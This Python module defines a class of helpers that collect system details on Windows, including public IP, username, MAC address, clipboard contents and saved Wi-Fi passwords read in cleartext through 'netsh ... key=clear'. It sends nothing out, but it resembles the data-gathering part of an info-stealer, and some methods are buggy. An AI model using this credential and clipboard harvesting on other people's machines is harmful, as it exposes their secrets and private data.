import os
import shutil
import sys
import ctypes
import requests
import socket
import platform
import time
import psutil
import pyperclip
import wmi

class Infopy:
    @staticmethod
    def getip():
        ip = requests.get('https://api.ipify.org').text
        return ip

    @staticmethod
    def pcname():
        pc_name = socket.gethostname()
        return pc_name
    
    @staticmethod
    def username():
        username = os.getenv("USERNAME")
        return username
    
    @staticmethod
    def osinfo():
        os_info = f"{platform.system()} {platform.release()}"
        return os_info
    
    @staticmethod
    def gpuname():
        gpu_info = wmi.WMI().Win32_VideoController()
        gpu = [gpu.Name for gpu in gpu_info]
        return gpu

    @staticmethod
    def gpudriverversion():
        gpu_info = wmi.WMI().Win32_VideoController()
        gpu = [gpu.DriverVersion for gpu in gpu_info]
        return gpu

    @staticmethod
    def macaddress():
        mac = os.popen("ipconfig /all").read()
        mac_address = None
        for line in mac.splitlines():
            if "Physical" in line: 
                mac_address = line.split(":")[1].strip()
                break
        return mac_address

    @staticmethod
    def clipboard():
        clipboard = pyperclip.paste()
        return clipboard
    
    @staticmethod
    def Powerplugged():
        pluggedin = psutil.sensors_battery().power_plugged
        pluggedin = "Plugged in" if pluggedin else "Not plugged in"
        return pluggedin
    
    @staticmethod
    def battery():
        battery = psutil.sensors_battery()  
        return battery.percent

    @staticmethod  
    def manumodel():
        manufacturer_info = os.popen("wmic computersystem get manufacturer, model").read()
        return manufacturer_info

    @staticmethod
    def wifinames():
        if os.name == 'nt':
            wifi_passwords = os.popen("netsh wlan show profiles").read().splitlines()
            wifi_list = [line.split(":")[1][1:] for line in wifi_passwords if "All User Profile" in line]
            for wifi in wifi_list:
                wifi_details = os.popen(f'netsh wlan show profile "{wifi}" key=clear').read()
        else:
            pass
        return wifi_list

    @staticmethod
    def wifipass():
        if os.name == 'nt':
            wifi_passwords = os.popen("netsh wlan show profiles").read().splitlines()
            wifi_list = [line.split(":")[1][1:] for line in wifi_passwords if "All User Profile" in line]
            for wifi in wifi_list:
                wifi_details = os.popen(f'netsh wlan show profile "{wifi}" key=clear').read()
        else:
            pass
        return wifi_details
    
    @staticmethod
    def cpuname():
        cpu_info = wmi.WMI().Win32_Processor()
        cpu = [cpu.Name for cpu in cpu_info]
        for cpu in cpu:
            return cpu
    
    @staticmethod
    def logicalprocessors():
        Logicalprocessors = psutil.cpu_count(logical=True)
        return Logicalprocessors
        
    @staticmethod
    def Cores():
        cores = psutil.cpu_count(logical=False)
        return cores
    
    @staticmethod
    def CurrentCpufrequency():
        currentcpufrequency = psutil.cpu_freq().current
        return currentcpufrequency
    
    @staticmethod
    def TotalCpufrequency():
        TotalCpufrequency = psutil.cpu_freq().max
        return TotalCpufrequency
    
    @staticmethod
    def diskinfo():
        disk = psutil.disk_usage('/')
        total = disk.total / (1024 ** 3)
        used = disk.used / (1024 ** 3)
        free = disk.free / (1024 ** 3)
        return f"Total: {total:.2f} GB, Used: {used:.2f} GB, Free: {free:.2f} GB"
    
    @staticmethod
    def cputemperature():
        try:
            sensors = psutil.sensors_temperatures()
            if 'coretemp' in sensors:
                cpu_temp = sensors['coretemp'][0].current
                return f"CPU Temperature: {cpu_temp}°C"
            else:
                return "CPU temperature info not available."
        except Exception as e:
            return f"Error fetching CPU temperature: {e}"
    
    @staticmethod
    def raminfo():
        ram = psutil.virtual_memory()
        total = ram.total / (1024 ** 3)
        used = ram.used / (1024 ** 3)
        available = ram.available / (1024 ** 3)
        return f"Total RAM: {total:.2f} GB, Used RAM: {used:.2f} GB, Available RAM: {available:.2f} GB"
    
    @staticmethod
    def networkinfo():
        interfaces = psutil.net_if_addrs()
        network_info = {}
        
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info[interface] = addr.address
        return network_info
    
    @staticmethod
    def uptime():
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
        return f"System Uptime: {uptime_str}"
    
    @staticmethod
    def systemdatetime():
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        timezone = time.strftime("%Z", time.localtime())
        return f"Current Time: {current_time}, Timezone: {timezone}"
